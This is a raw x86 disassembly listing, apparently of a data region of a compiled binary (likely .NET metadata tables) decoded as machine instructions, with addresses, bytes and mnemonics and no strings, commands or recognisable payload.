  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	bc 1d 64 02 5c       	mov    $0x5c02641d,%esp
  4069db:	00 7c 25 00          	add    %bh,0x0(%ebp,%eiz,1)
  4069df:	00 00                	add    %al,(%eax)
  4069e1:	00 86 18 f3 1d 0e    	add    %al,0xe1df318(%esi)
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 e2                	add    %ah,%dl
  4069f3:	21 b1 02 5c 00 8f    	and    %esi,-0x70ffa3fe(%ecx)
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 71 15             	add    %dh,0x15(%ecx)
  406a02:	b8 02 5e 00 44       	mov    $0x44005e02,%eax
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 0f                	add    %cl,(%edi)
  406a0f:	1c be                	sbb    $0xbe,%al
  406a11:	02 5f 00             	add    0x0(%edi),%bl
  406a14:	78 20                	js     0x406a36
  406a16:	00 00                	add    %al,(%eax)
  406a18:	00 00                	add    %al,(%eax)
  406a1a:	86 18                	xchg   %bl,(%eax)
  406a1c:	f3 1d 0e 00 61 00    	repz sbb $0x61000e,%eax
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 48 05             	add    %cl,0x5(%eax)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 89 1d cb 02 62    	add    %cl,0x6202cb1d(%ecx)
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 49 1b             	add    %cl,0x1b(%ecx)
  406a48:	d2 02                	rolb   %cl,(%edx)
  406a4a:	64 00 ab 25 00 00 00 	add    %ch,%fs:0x25(%ebx)
  406a51:	00 96 00 63 08 da    	add    %dl,-0x25f79d00(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 30                	add    %dh,(%eax)
  406a63:	24 e1                	and    $0xe1,%al
  406a65:	02 68 00             	add    0x0(%eax),%ch
  406a68:	e6 25                	out    %al,$0x25
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	00 00                	add    %al,(%eax)
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 14 24             	add    %dl,(%esp)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 2b                	add    %ch,(%ebx)
  406a7f:	01 ef                	add    %ebp,%edi
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 4d 02             	add    %cl,0x2(%ebp)
  406a8e:	f6 02 6e             	testb  $0x6e,(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	f3 1d 0e 00 70 00    	repz sbb $0x70000e,%eax
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 a3 0d 84 01 70    	add    %ah,0x7001840d(%ebx)
  406aad:	00 6c 59 00          	add    %ch,0x0(%ecx,%ebx,2)
  406ab1:	00 00                	add    %al,(%eax)
  406ab3:	00 96 00 68 26 84    	add    %dl,-0x7bd99800(%esi)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	73 06                	jae    0x406ac8
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	43                   	inc    %ebx
  406ac7:	13 00                	adc    (%eax),%eax
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 ad 05 00 00 01    	add    %ch,0x1000005(%ebp)
  406ad1:	00 a5 01 00 00 01    	add    %ah,0x1000001(%ebp)
  406ad7:	00 76 0a             	add    %dh,0xa(%esi)
  406ada:	00 00                	add    %al,(%eax)
  406adc:	01 00                	add    %eax,(%eax)
  406ade:	bb 24 00 00 01       	mov    $0x1000024,%ebx
  406ae3:	00 d4                	add    %dl,%ah
  406ae5:	09 00                	or     %eax,(%eax)
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 f5                	add    %dh,%ch
  406aeb:	03 00                	add    (%eax),%eax
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 7e 08             	add    %bh,0x8(%esi)
  406af2:	00 00                	add    %al,(%eax)
  406af4:	01 00                	add    %eax,(%eax)
  406af6:	94                   	xchg   %eax,%esp
  406af7:	25 00 00 01 00       	and    $0x10000,%eax
  406afc:	25 03 00 00 01       	and    $0x1000003,%eax
  406b01:	00 c0                	add    %al,%al
  406b03:	16                   	push   %ss
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	da 03                	fiaddl (%ebx)
  406b0a:	00 00                	add    %al,(%eax)
  406b0c:	03 00                	add    (%eax),%eax
  406b0e:	8f 06                	pop    (%esi)
  406b10:	00 00                	add    %al,(%eax)
  406b12:	04 00                	add    $0x0,%al
  406b14:	8e 07                	mov    (%edi),%es
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	9b                   	fwait
  406b1b:	05 00 00 01 00       	add    $0x10000,%eax
  406b20:	02 23                	add    (%ebx),%ah
  406b22:	00 00                	add    %al,(%eax)
  406b24:	01 00                	add    %eax,(%eax)
  406b26:	7b 0d                	jnp    0x406b35
  406b28:	00 00                	add    %al,(%eax)
  406b2a:	01 00                	add    %eax,(%eax)
  406b2c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b2d:	1b 00                	sbb    (%eax),%eax
  406b2f:	00 01                	add    %al,(%ecx)
  406b31:	00 e8                	add    %ch,%al
  406b33:	03 00                	add    (%eax),%eax
  406b35:	00 01                	add    %al,(%ecx)
  406b37:	00 93 15 00 00 01    	add    %dl,0x1000015(%ebx)
  406b3d:	00 b1 01 00 00 02    	add    %dh,0x2000001(%ecx)
  406b43:	00 9d 06 00 00 03    	add    %bl,0x3000006(%ebp)
  406b49:	00 0e                	add    %cl,(%esi)
  406b4b:	15 00 00 01 00       	adc    $0x10000,%eax
  406b50:	58                   	pop    %eax
  406b51:	1e                   	push   %ds
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	c4 06                	les    (%esi),%eax
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	02 00                	add    (%eax),%al
  406b5c:	0a 09                	or     (%ecx),%cl
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	0e                   	push   %cs
  406b63:	01 00                	add    %eax,(%eax)
  406b65:	00 01                	add    %al,(%ecx)
  406b67:	00 00                	add    %al,(%eax)
  406b69:	01 00                	add    %eax,(%eax)
  406b6b:	00 02                	add    %al,(%edx)
  406b6d:	00 d6                	add    %dl,%dh
  406b6f:	08 00                	or     %al,(%eax)
  406b71:	00 03                	add    %al,(%ebx)
  406b73:	00 96 13 00 00 01    	add    %dl,0x1000013(%esi)
  406b79:	00 0a                	add    %cl,(%edx)
  406b7b:	0c 00                	or     $0x0,%al
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 08                	add    %cl,(%eax)
  406b81:	21 00                	and    %eax,(%eax)
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 bd 09 00 00 02    	add    %bh,0x2000009(%ebp)
  406b8b:	00 a0 24 00 00 01    	add    %ah,0x1000024(%eax)
  406b91:	00 58 03             	add    %bl,0x3(%eax)
  406b94:	00 00                	add    %al,(%eax)
  406b96:	01 00                	add    %eax,(%eax)
  406b98:	6e                   	outsb  %ds:(%esi),(%dx)
  406b99:	01 00                	add    %eax,(%eax)
  406b9b:	00 01                	add    %al,(%ecx)
  406b9d:	00 6a 07             	add    %ch,0x7(%edx)
  406ba0:	00 00                	add    %al,(%eax)
  406ba2:	01 00                	add    %eax,(%eax)
  406ba4:	4e                   	dec    %esi
  406ba5:	09 00                	or     %eax,(%eax)
  406ba7:	00 01                	add    %al,(%ecx)
  406ba9:	00 fc                	add    %bh,%ah
  406bab:	04 00                	add    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 86 26 00 00 01    	add    %al,0x1000026(%esi)
  406bb5:	00 46 08             	add    %al,0x8(%esi)
  406bb8:	00 00                	add    %al,(%eax)
  406bba:	01 00                	add    %eax,(%eax)
  406bbc:	1c 13                	sbb    $0x13,%al
  406bbe:	00 00                	add    %al,(%eax)
  406bc0:	01 00                	add    %eax,(%eax)
  406bc2:	e4 15                	in     $0x15,%al
  406bc4:	00 00                	add    %al,(%eax)
  406bc6:	01 00                	add    %eax,(%eax)
  406bc8:	40                   	inc    %eax
  406bc9:	06                   	push   %es
  406bca:	00 00                	add    %al,(%eax)
  406bcc:	01 00                	add    %eax,(%eax)
  406bce:	9c                   	pushf
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bd9:	00 56 1b             	add    %dl,0x1b(%esi)
  406bdc:	00 00                	add    %al,(%eax)
  406bde:	01 00                	add    %eax,(%eax)
  406be0:	e3 24                	jecxz  0x406c06
  406be2:	00 00                	add    %al,(%eax)
  406be4:	01 00                	add    %eax,(%eax)
  406be6:	3b 24 00             	cmp    (%eax,%eax,1),%esp
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 ef                	add    %ch,%bh
  406bed:	04 00                	add    $0x0,%al
  406bef:	00 01                	add    %al,(%ecx)
  406bf1:	00 1d 1c 00 00 01    	add    %bl,0x100001c
  406bf7:	00 5f 0d             	add    %bl,0xd(%edi)
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	38 04 00             	cmp    %al,(%eax,%eax,1)
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 99 03 00 00 01    	add    %bl,0x1000003(%ecx)
  406c09:	00 51 07             	add    %dl,0x7(%ecx)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	8e 18                	mov    (%eax),%ds
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406c17:	03 00                	add    (%eax),%eax
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 0c 07             	add    %cl,(%edi,%eax,1)
  406c1e:	00 00                	add    %al,(%eax)
  406c20:	01 00                	add    %eax,(%eax)
  406c22:	c3                   	ret
  406c23:	00 00                	add    %al,(%eax)
  406c25:	00 02                	add    %al,(%edx)
  406c27:	00 03                	add    %al,(%ebx)
  406c29:	04 00                	add    $0x0,%al
  406c2b:	00 01                	add    %al,(%ecx)
  406c2d:	00 08                	add    %cl,(%eax)
  406c2f:	24 00                	and    $0x0,%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 c1                	add    %al,%cl
  406c35:	1b 00                	sbb    (%eax),%eax
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 cb                	add    %cl,%bl
  406c3b:	05 00 00 01 00       	add    $0x10000,%eax
  406c40:	c6                   	(bad)
  406c41:	24 00                	and    $0x0,%al
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 b9 0a 00 00 01    	add    %bh,0x100000a(%ecx)
  406c4b:	00 b3 03 00 00 01    	add    %dh,0x1000003(%ebx)
  406c51:	00 fe                	add    %bh,%dh
  406c53:	05 00 00 01 00       	add    $0x10000,%eax
  406c58:	0b 08                	or     (%eax),%ecx
  406c5a:	00 00                	add    %al,(%eax)
  406c5c:	01 00                	add    %eax,(%eax)
  406c5e:	76 1a                	jbe    0x406c7a
  406c60:	00 00                	add    %al,(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	76 26                	jbe    0x406c8c
  406c66:	00 00                	add    %al,(%eax)
  406c68:	01 00                	add    %eax,(%eax)
  406c6a:	0d 02 00 00 01       	or     $0x1000002,%eax
  406c6f:	00 ed                	add    %ch,%ch
  406c71:	20 00                	and    %al,(%eax)
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 b2 26 00 00 02    	add    %dh,0x2000026(%edx)
  406c7b:	00 15 21 00 00 01    	add    %dl,0x1000021
  406c81:	00 7d 05             	add    %bh,0x5(%ebp)
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406c89:	16                   	push   %ss
  406c8a:	00 00                	add    %al,(%eax)
  406c8c:	01 00                	add    %eax,(%eax)
  406c8e:	65 09 00             	or     %eax,%gs:(%eax)
  406c91:	00 01                	add    %al,(%ecx)
  406c93:	00 94 24 00 00 01 00 	add    %dl,0x10000(%esp)
  406c9a:	34 18                	xor    $0x18,%al
  406c9c:	00 00                	add    %al,(%eax)
  406c9e:	01 00                	add    %eax,(%eax)
  406ca0:	88 17                	mov    %dl,(%edi)
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	01 00                	add    %eax,(%eax)
  406ca6:	b7 08                	mov    $0x8,%bh
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	02 0a                	add    (%edx),%cl
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	1d 04 00 00 01       	sbb    $0x1000004,%eax
  406cb7:	00 9a 0a 00 00 01    	add    %bl,0x100000a(%edx)
  406cbd:	00 c7                	add    %al,%bh
  406cbf:	08 00                	or     %al,(%eax)
  406cc1:	00 01                	add    %al,(%ecx)
  406cc3:	00 01                	add    %al,(%ecx)
  406cc5:	25 00 00 01 00       	and    $0x10000,%eax
  406cca:	01 07                	add    %eax,(%edi)
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	15 0b 00 00 01       	adc    $0x100000b,%eax
  406cd5:	00 a7 07 00 00 01    	add    %ah,0x1000007(%edi)
  406cdb:	00 9a 07 00 00 01    	add    %bl,0x1000007(%edx)
  406ce1:	00 f8                	add    %bh,%al
  406ce3:	17                   	pop    %ss
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	ac                   	lods   %ds:(%esi),%al
  406ce9:	04 00                	add    $0x0,%al
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 93 02 00 00 01    	add    %dl,0x1000002(%ebx)
  406cf3:	00 8e 08 00 00 02    	add    %cl,0x2000008(%esi)
  406cf9:	00 00                	add    %al,(%eax)
  406cfb:	15 00 00 01 00       	adc    $0x10000,%eax
  406d00:	55                   	push   %ebp
  406d01:	08 00                	or     %al,(%eax)
  406d03:	00 01                	add    %al,(%ecx)
  406d05:	00 32                	add    %dh,(%edx)
  406d07:	02 00                	add    (%eax),%al
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 af 18 00 00 01    	add    %ch,0x1000018(%edi)
  406d11:	00 4f 26             	add    %cl,0x26(%edi)
  406d14:	00 00                	add    %al,(%eax)
  406d16:	02 00                	add    (%eax),%al
  406d18:	5e                   	pop    %esi
  406d19:	07                   	pop    %es
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	8b 16                	mov    (%esi),%edx
  406d20:	00 00                	add    %al,(%eax)
  406d22:	02 00                	add    (%eax),%al
  406d24:	36 07                	ss pop %es
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	d0 1b                	rcrb   $1,(%ebx)
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	4a                   	dec    %edx
  406d31:	03 00                	add    (%eax),%eax
  406d33:	00 01                	add    %al,(%ecx)
  406d35:	00 50 0b             	add    %dl,0xb(%eax)
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	0b 06                	or     (%esi),%eax
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	ef                   	out    %eax,(%dx)
  406d43:	00 00                	add    %al,(%eax)
  406d45:	00 02                	add    %al,(%edx)
  406d47:	00 2d 1b 00 00 01    	add    %ch,0x100001b
  406d4d:	00 eb                	add    %ch,%bl
  406d4f:	07                   	pop    %es
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	7a 13                	jp     0x406d69
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	87 13                	xchg   %edx,(%ebx)
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	0f 0a                	(bad)
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 a0 22 bb    	add    %dh,-0x44dd6000(%ecx)
  406d6f:	01 b1 00 79 23 bf    	add    %esi,-0x40dc8700(%ecx)
  406d75:	01 b1 00 af 21 0e    	add    %esi,0xe21af00(%ecx)
  406d7b:	00 b9 00 db 1d 64    	add    %bh,0x641ddb00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 f3                	add    %dh,%bl
  406d85:	1d 01 03 d1 00       	sbb    $0xd10301,%eax
  406d8a:	f3 1d 0e 00 d9 00    	repz sbb $0xd9000e,%eax
  406d90:	f3 1d 2e 03 e9 00    	repz sbb $0xe9032e,%eax
  406d96:	f3 1d 6b 01 f1 00    	repz sbb $0xf1016b,%eax
  406d9c:	f3 1d 6b 01 f9 00    	repz sbb $0xf9016b,%eax
  406da2:	f3 1d 6b 01 01 01    	repz sbb $0x101016b,%eax
  406da8:	f3 1d 6b 01 09 01    	repz sbb $0x109016b,%eax
  406dae:	f3 1d 6b 01 11 01    	repz sbb $0x111016b,%eax
  406db4:	f3 1d 6b 01 19 01    	repz sbb $0x119016b,%eax
  406dba:	f3 1d 6b 01 21 01    	repz sbb $0x121016b,%eax
  406dc0:	f3 1d 6b 01 29 01    	repz sbb $0x129016b,%eax
  406dc6:	f3 1d 6b 01 31 01    	repz sbb $0x131016b,%eax
  406dcc:	f3 1d 4b 02 39 01    	repz sbb $0x139024b,%eax
  406dd2:	f3 1d 0e 00 41 01    	repz sbb $0x141000e,%eax
  406dd8:	f3 1d 6b 01 49 01    	repz sbb $0x149016b,%eax
  406dde:	71 1b                	jno    0x406dfb
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 44 00 c4          	add    %eax,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	dd 21                	frstor (%ecx)
  406dec:	7f 00                	jg     0x406dee
  406dee:	51                   	push   %ecx
  406def:	01 d8                	add    %ebx,%eax
  406df1:	18 84 00 09 00 f3 1d 	sbb    %al,0x1df30009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	8a 00                	mov    (%eax),%al
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 32                	add    %esi,(%edx)
  406e03:	14 2a                	adc    $0x2a,%al
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	84 14 d3             	test   %dl,(%ebx,%edx,8)
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 f3                	add    %dh,%bl
  406e0f:	1d 2b 02 11 00       	sbb    $0x11022b,%eax
  406e14:	7a 25                	jp     0x406e3b
  406e16:	d9 03                	flds   (%ebx)
  406e18:	69 01 52 25 df 03    	imul   $0x3df2552,(%ecx),%eax
  406e1e:	61                   	popa
  406e1f:	01 96 1f e5 03 81    	add    %edx,-0x7efc1ae1(%esi)
  406e25:	01 7d 01             	add    %edi,0x1(%ebp)
  406e28:	c7 00 79 01 27 15    	movl   $0x15270179,(%eax)
  406e2e:	eb 03                	jmp    0x406e33
  406e30:	19 00                	sbb    %eax,(%eax)
  406e32:	f3 1d 09 04 19 00    	repz sbb $0x190409,%eax
  406e38:	fa                   	cli
  406e39:	12 01                	adc    (%ecx),%al
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 e7                	add    %ah,%bh
  406e3f:	12 01                	adc    (%ecx),%al
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 03                	add    %eax,(%ebx)
  406e45:	26 16                	es push %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 d7                	add    %edx,%edi
  406e4b:	21 1c 04             	and    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	f3 1d 0e 00 d1 01    	repz sbb $0x1d1000e,%eax
  406e56:	7d 23                	jge    0x406e7b
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 37                	add    %esi,(%edi)
  406e5d:	1f                   	pop    %ds
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 6b 21             	add    %ch,0x21(%ebx)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 c2                	add    %al,%dl
  406e69:	0b bf 01 19 00 6b    	or     0x6b001901(%edi),%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 f3                	add    %esi,%ebx
  406e75:	1d 0e 00 a1 01       	sbb    $0x1a1000e,%eax
  406e7a:	f3 1d 36 02 99 01    	repz sbb $0x1990236,%eax
  406e80:	f5                   	cmc
  406e81:	1f                   	pop    %ds
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 52 14             	add    %edx,0x14(%edx)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 d7             	roll   $0xd7,(%ecx)
  406e8d:	21 3f                	and    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 7d 23             	add    %edi,0x23(%ebp)
  406e94:	49                   	dec    %ecx
  406e95:	04 f1                	add    $0xf1,%al
  406e97:	01 5e 10             	add    %ebx,0x10(%esi)
  406e9a:	0e                   	push   %cs
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 f3                	add    %esi,%ebx
  406e9f:	1d 4f 04 01 02       	sbb    $0x201044f,%eax
  406ea4:	f3 1d 56 04 21 00    	repz sbb $0x210456,%eax
  406eaa:	f3 1d 5c 04 19 00    	repz sbb $0x19045c,%eax
  406eb0:	d2 22                	shlb   %cl,(%edx)
  406eb2:	66 04 09             	data16 add $0x9,%al
  406eb5:	00 61 14             	add    %ah,0x14(%ecx)
  406eb8:	47                   	inc    %edi
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 4e 22             	add    %cl,0x22(%esi)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 f3                	add    %bl,%dh
  406ec3:	1d 56 04 29 00       	sbb    $0x290456,%eax
  406ec8:	f3 1d 78 04 31 02    	repz sbb $0x2310478,%eax
  406ece:	f3 1d 56 04 c1 00    	repz sbb $0xc10456,%eax
  406ed4:	9a 0b 82 04 39 02 b9 	lcall  $0xb902,$0x3904820b
  406edb:	0f 8f 04 31 00 05    	jg     0x5409fe5
  406ee1:	20 96 04 c1 00 5e    	and    %dl,0x5e00c104(%esi)
  406ee7:	10 0e                	adc    %cl,(%esi)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 5e 10             	add    %bl,0x10(%esi)
  406eee:	0e                   	push   %cs
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 5e 10             	add    %bl,0x10(%esi)
  406ef4:	0e                   	push   %cs
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 92 0b a1 04 49    	add    %dl,0x4904a10b(%edx)
  406efd:	02 44 00 a7          	add    -0x59(%eax,%eax,1),%al
  406f01:	04 c1                	add    $0xc1,%al
  406f03:	00 9f 0b ae 04 51    	add    %bl,0x5104ae0b(%edi)
  406f09:	02 f3                	add    %bl,%dh
  406f0b:	1d 56 04 49 01       	sbb    $0x1490456,%eax
  406f10:	f3 1d b6 04 49 01    	repz sbb $0x14904b6,%eax
  406f16:	3c 23                	cmp    $0x23,%al
  406f18:	bd 04 61 02 61       	mov    $0x61026104,%ebp
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	96                   	xchg   %eax,%esi
  406f23:	1f                   	pop    %ds
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 83 17 d6 04 c1    	add    %al,-0x3efb29e9(%ebx)
  406f2d:	00 b6 10 de 04 59    	add    %dh,0x5904de10(%esi)
  406f33:	02 f3                	add    %bl,%dh
  406f35:	1d 2b 02 c1 00       	sbb    $0xc1022b,%eax
  406f3a:	f8                   	clc
  406f3b:	19 15 02 c1 00 32    	sbb    %edx,0x3200c102
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	dd 21                	frstor (%ecx)
  406f48:	9a 00 71 02 63 21 0a 	lcall  $0xa21,$0x63027100
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	0f 1f c7             	nop    %edi
  406f55:	00 a1 02 fc 0f 01    	add    %ah,0x10ffc02(%ecx)
  406f5b:	05 79 02 f3 1d       	add    $0x1df30279,%eax
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 9c 20 07 05 81 02 	add    0x2810507(%eax,%eiz,1),%bl
  406f6a:	01 0f                	add    %ecx,(%edi)
  406f6c:	0d 05 a9 02 4a       	or     $0x4a02a905,%eax
  406f71:	0f 47 02             	cmova  (%edx),%eax
  406f74:	b1 02                	mov    $0x2,%cl
  406f76:	9f                   	lahf
  406f77:	0f 47 02             	cmova  (%edx),%eax
  406f7a:	c1 01 0f             	roll   $0xf,(%ecx)
  406f7d:	26 16                	es push %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 2a                	add    (%edx),%ch
  406f83:	1f                   	pop    %ds
  406f84:	13 05 81 02 7e 17    	adc    0x177e0281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 f3 1d 0e    	add    %cl,0xe1df302(%ecx)
  406f91:	00 89 02 57 0f 6b    	add    %cl,0x6b0f5702(%ecx)
  406f97:	01 b1 02 41 0f 47    	add    %esi,0x470f4102(%ecx)
  406f9d:	02 a1 02 46 19 c7    	add    -0x38e6b9fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 23                	add    %esp,(%ebx)
  406fa7:	21 1a                	and    %ebx,(%edx)
  406fa9:	05 89 02 cb 20       	add    $0x20cb0289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 1e                	add    (%esi),%bl
  406fb3:	0f 20 05             	mov    %cr0,%ebp
  406fb6:	89 02                	mov    %eax,(%edx)
  406fb8:	5c                   	pop    %esp
  406fb9:	24 4b                	and    $0x4b,%al
  406fbb:	02 81 02 3c 23 27    	add    0x27233c02(%ecx),%al
  406fc1:	05 c1 02 3d 1d       	add    $0x1d3d02c1,%eax
  406fc6:	30 05 c9 02 6c 10    	xor    %al,0x106c02c9
  406fcc:	c7 00 91 02 6f 25    	movl   $0x256f0291,(%eax)
  406fd2:	35 05 c1 01 23       	xor    $0x2301c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 81 12       	add    $0x12810291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 e6 20       	add    $0x20e602d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406fe9:	10 3e                	adc    %bh,(%esi)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 f3                	add    %bl,%dh
  406fef:	1d 4c 05 d9 02       	sbb    $0x2d9054c,%eax
  406ff4:	89 1f                	mov    %ebx,(%edi)
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 64 0f c3       	mov    0xc30f6402,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 23                	add    %esp,(%ebx)
  407001:	21 01                	and    %eax,(%ecx)
